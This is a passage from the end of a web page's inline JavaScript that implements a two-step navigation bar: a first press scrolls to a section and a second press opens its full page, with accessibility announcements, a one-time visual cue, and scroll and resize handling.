catch (err) { /* storage blocked: the cue falls back to once per page load */ } }\n      };\n      const make = (tag, className, text) => {\n        const node = document.createElement(tag);\n        if (className) node.className = className;\n        if (text) node.textContent = text;\n        return node;\n      };\n\n      // The scroll offset tracks the sticky bar, however many rows it wraps to.\n      const syncNavHeight = () => document.documentElement.style.setProperty(\'--nav-h\', nav.offsetHeight + \'px\');\n      syncNavHeight();\n      if (\'ResizeObserver\' in window) new ResizeObserver(syncNavHeight).observe(nav);\n\n      const live = make(\'p\', \'visually-hidden\');\n      live.setAttribute(\'aria-live\', \'polite\');\n      document.body.append(live);\n      const cue = make(\'div\', \'nav-cue\');\n      cue.setAttribute(\'aria-hidden\', \'true\');\n      nav.append(cue);\n\n      let armed = null;\n      let pointer = \'mouse\';\n      let cuedThisLoad = false;\n      let cueTimer = 0;\n      nav.addEventListener(\'pointerdown\', e => { pointer = e.pointerType || \'mouse\'; }, { passive: true });\n\n      // The markup carries today\'s href, so with JavaScript off every link opens\n      // what it opens today (Status still opens status.html). The script holds\n      // both targets and sets the idle href to the section only now that it runs.\n      const entries = links.map(link => {\n        const section = document.getElementById(link.dataset.section);\n        if (!section) return null;               // no section: the link keeps the href it was served with\n        const label = link.textContent.trim();\n        const hash = \'#\' + link.dataset.section;\n        // The idle href stays whatever the markup served, so a modifier-click, a\n        // middle-click and a crawler keep today\'s target: Status still opens status.html.\n        const served = link.getAttribute(\'href\');\n        const bead = make(\'span\', \'nav-bead\');\n        bead.setAttribute(\'aria-hidden\', \'true\');\n        link.append(bead);\n        return { link, hash, served, label, section, page: link.dataset.page,\n                 offer: section.querySelector(\'.section-offer\'),\n                 observer: null, startTimer: 0, idleTimer: 0, onScroll: null };\n      }).filter(Boolean);\n      if (!entries.length) return;\n      nav.classList.add(\'two-step\');             // only now is the bead\'s space reserved\n\n      // The guard keeps the NAV link from leaving a mounted checker: once\n      // #pg-mount has class .loaded, Playground only scrolls and never arms.\n      // It does not cover the two explicit page links beside and below the\n      // checker; those say where they go, and one click still follows them.\n      const playgroundBusy = entry =>\n        entry.section.id === \'try\' && document.querySelector(\'#pg-mount.loaded\') !== null;\n\n      function hideCue() {\n        clearTimeout(cueTimer);\n        cue.classList.remove(\'is-on\');\n      }\n\n      function showCue(entry, how) {\n        const seen = store.get();\n        if (cuedThisLoad || seen === \'learned\' || Number(seen) >= CUE_LIMIT) return false;\n        cuedThisLoad = true;\n        store.set(String((Number(seen) || 0) + 1));\n\n        const beats = make(\'span\', \'beats\');\n        beats.append(make(\'i\'), make(\'i\'));\n        const words = make(\'span\');\n        if (how === \'key\') words.append(\'Press Enter again for the full page\');\n        else words.append(how === \'touch\' ? \'Tap \' : \'Click \', make(\'b\', \'\', entry.label), \' again for the full page\');\n        const more = make(\'span\', \'nav-cue-more\', \'· links marked \');\n        more.append(make(\'span\', \'nav-bead\'), \' work this way\');\n        cue.replaceChildren(beats, words, more);   // text nodes and elements only, no innerHTML\n\n        const navBox = nav.getBoundingClientRect();\n        const linkBox = entry.link.getBoundingClientRect();\n        const centre = linkBox.left + linkBox.width / 2 - navBox.left;\n        if (window.matchMedia(\'(min-width: 901px)\').matches) {\n          const width = cue.offsetWidth;\n          const left = Math.min(Math.max(centre - width / 2, 16), navBox.width - width - 16);\n          cue.style.setProperty(\'--cue-left\', left + \'px\');\n          cue.style.setProperty(\'--caret\', (centre - left) + \'px\');\n        } else {\n          cue.style.setProperty(\'--caret\', (centre - 16) + \'px\');\n        }\n        cue.classList.remove(\'is-on\');\n        void cue.offsetWidth;                   // restart the entrance\n        cue.classList.add(\'is-on\');\n        cueTimer = setTimeout(hideCue, CUE_MS);\n        return true;\n      }\n\n      function clearWaits(entry) {\n        clearTimeout(entry.startTimer);\n        clearTimeout(entry.idleTimer);\n        if (entry.onScroll) window.removeEventListener(\'scroll\', entry.onScroll);\n        entry.onScroll = null;\n      }\n\n      function disarm(entry = armed) {\n        if (!entry || entry !== armed) return;\n        armed = null;\n        clearWaits(entry);\n        if (entry.observer) entry.observer.disconnect();\n        entry.observer = null;\n        entry.link.setAttribute(\'href\', entry.served);\n        entry.link.classList.remove(\'is-armed\');\n        entry.link.removeAttribute(\'aria-label\');\n        if (entry.offer) entry.offer.classList.remove(\'is-armed\', \'is-offering\');\n        live.textContent = \'\';\n        hideCue();\n      }\n\n      function arrive(entry, how) {\n        if (entry.offer) {\n          entry.offer.classList.remove(\'is-offering\');\n          void entry.offer.offsetWidth;          // replay the one-shot ring on every arrival\n          entry.offer.classList.add(\'is-armed\', \'is-offering\');\n        }\n        const cued = showCue(entry, how);\n        const seat = (how === \'key\' && entry.offer) ? \' The full page link now has focus.\' : \'\';\n        const lesson = !cued ? \'\'\n          : (how === \'key\' && entry.offer) ? \' Activate it to open the full page.\'\n          : \' Activate \' + entry.label + \' again to open the full page.\';\n        live.textContent = entry.label + \' section.\' + seat + lesson;\n      }\n\n      function arm(entry, how) {\n        disarm();\n        armed = entry;\n        entry.link.setAttribute(\'href\', entry.page);          // the next press is an ordinary link to the page\n        entry.link.classList.add(\'is-armed\');\n        entry.link.setAttribute(\'aria-label\', entry.label + \', opens full page\');\n        let reached = false;\n\n        // The band runs from the bar\'s bottom edge down the viewport, and its\n        // bottom margin is measured in pixels so a short viewport (a tall bar,\n        // or 400% zoom) still leaves at least 48px of band for arrival to fire.\n        const navH = nav.offsetHeight;\n        const view = window.innerHeight;\n        const bottom = Math.max(0, Math.round(view - Math.max(navH + BAND_MIN_PX, view * 0.6)));\n        entry.observer = new IntersectionObserver(records => {\n          const record = records[records.length - 1];\n          if (armed !== entry) return;\n          if (record.isIntersecting && !reached) { reached = true; clearWaits(entry); arrive(entry, how); }\n          else if (!record.isIntersecting && reached) disarm(entry);\n        }, { rootMargin: \'-\' + navH + \'px 0px -\' + bottom + \'px 0px\' });\n        entry.observer.observe(entry.section);                // a fresh observer reports the current state at once\n\n        // A visitor who overrides the scroll never arrives. Wait while the page\n        // is still moving, then give up; and give up anyway if no scroll starts.\n        entry.onScroll = () => {\n          clearTimeout(entry.idleTimer);\n          entry.idleTimer = setTimeout(() => { if (armed === entry && !reached) disarm(entry); }, IDLE_MS);\n        };\n        window.addEventListener(\'scroll\', entry.onScroll, { passive: true });\n        entry.startTimer = setTimeout(() => { if (armed === entry && !reached) disarm(entry); }, START_WAIT_MS);\n      }\n\n      entries.forEach(entry => {\n        // A double-click would select the label text; keep the second press a clean click.\n        entry.link.addEventListener(\'mousedown\', e => { if (e.detail > 1) e.preventDefault(); });\n        entry.link.addEventListener(\'click\', e => {\n          if (armed === entry) {\n            if (!playgroundBusy(entry)) {        // second press: the browser follows href to the page\n              store.set(\'learned\');\n              hideCue();\n              return;\n            }\n            e.preventDefault();                  // the mounted checker holds typed work: stay on this page\n            disarm(entry);\n            goTo(entry.section);\n            return;\n          }\n          if (!plainPress(e)) return;            // new-tab gestures keep the browser default\n          e.preventDefault();\n          const how = e.detail === 0 ? \'key\' : (pointer === \'touch\' || pointer === \'pen\') ? \'touch\' : \'click\';\n          goTo(entry.section);\n          if (playgroundBusy(entry)) { disarm(); return; }\n          arm(entry, how);\n          if (how === \'key\' && entry.offer) entry.offer.focus({ preventScroll: true });\n        });\n        if (entry.offer) entry.offer.addEventListener(\'click\', () => store.set(\'learned\'));\n      });\n\n      const brand = nav.querySelector(\'a.brand\');\n      if (brand) brand.addEventListener(\'click\', e => { if (plainPress(e)) disarm(); });\n      const loadChecker = document.getElementById(\'pg-load\');\n      if (loadChecker) loadChecker.addEventListener(\'click\', () => { if (armed && armed.section.id === \'try\') disarm(); });\n      cue.addEventListener(\'click\', hideCue);\n      document.addEventListener(\'keydown\', e => { if (e.key === \'Escape\' && armed) disarm(); });\n      window.addEventListener(\'pageshow\', e => { if (e.persisted) disarm(); });   // Back from the page: start clean\n      // The layout viewport, not window.innerWidth: iOS Safari reports the\n      // visual viewport there, so a pinch-zoom would disarm the link.\n      let lastWidth = document.documentElement.clientWidth;\n      window.addEventListener(\'resize\', () => {\n        const width = document.documentElement.clientWidth;\n        if (width === lastWidth) return;         // a phone\'s URL bar changes only the height\n        lastWidth = width;\n        disarm();\n      }, { passive: true });\n\n      // iOS Safari is unverified: no iPhone run is recorded for the second tap\n      // during a programmatic smooth scroll. The idle failsafe above covers a\n      // scroll that stops early, and touch-action: manipulation covers the zoom.\n    } catch (err) { /* the enhancement is off; the links jump natively */ }\n  })();\n</script>\n</body>\n</html>\n<!-- cache-refresh -->\n'

